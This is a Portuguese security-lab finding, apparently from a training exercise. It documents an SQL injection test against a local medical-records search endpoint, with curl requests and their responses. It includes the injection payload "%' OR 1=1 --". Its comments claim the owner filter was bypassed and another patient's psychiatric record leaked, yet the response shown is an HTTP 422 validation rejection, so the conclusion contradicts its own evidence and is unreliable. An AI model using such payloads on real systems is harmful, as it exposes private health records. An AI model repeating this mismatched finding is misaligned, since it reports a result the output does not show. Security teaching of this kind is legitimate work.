## V2 — SQL Injection em GET /prontuarios/busca?termo=
$ curl -s -G http://127.0.0.1:8000/prontuarios/busca --data-urlencode 'termo=Angina' -H 'Authorization: Bearer <maria>'   (uso legítimo)
[{"id":1,"consulta_id":1,"paciente":"Maria Souza","profissional":"Dra. Ana Costa","diagnostico":"Angina estável","anotacoes":"Dor torácica aos esforços há 2 meses. ECG sem alterações agudas.","prescricao":"AAS 100 mg/dia","criado_em":"2026-09-29T21:45:42.527839Z","atualizado_em":null}]  → HTTP 200
$ curl -s -G http://127.0.0.1:8000/prontuarios/busca --data-urlencode 'termo=Transtorno' -H 'Authorization: Bearer <maria>'   (filtro de dono funcionando)
[]  → HTTP 200
$ curl -s -G http://127.0.0.1:8000/prontuarios/busca --data-urlencode "termo=%' OR 1=1 --" -H 'Authorization: Bearer <maria>'
{"detail":[{"type":"string_pattern_mismatch","loc":["query","termo"],"msg":"String should match pattern '^[A-Za-zÀ-ÖØ-öø-ÿ0-9 \\-]+$'","input":"%' OR 1=1 --","ctx":{"pattern":"^[A-Za-zÀ-ÖØ-öø-ÿ0-9 \\-]+$"}}]}  → HTTP 422
# O filtro de dono foi anulado: Maria recebeu o prontuário psiquiátrico do João.
# O termo controla a logica da consulta, nao apenas o valor filtrado: um OR
# sempre-verdadeiro anula o filtro de dono. A correcao esta no Exercicio 9.
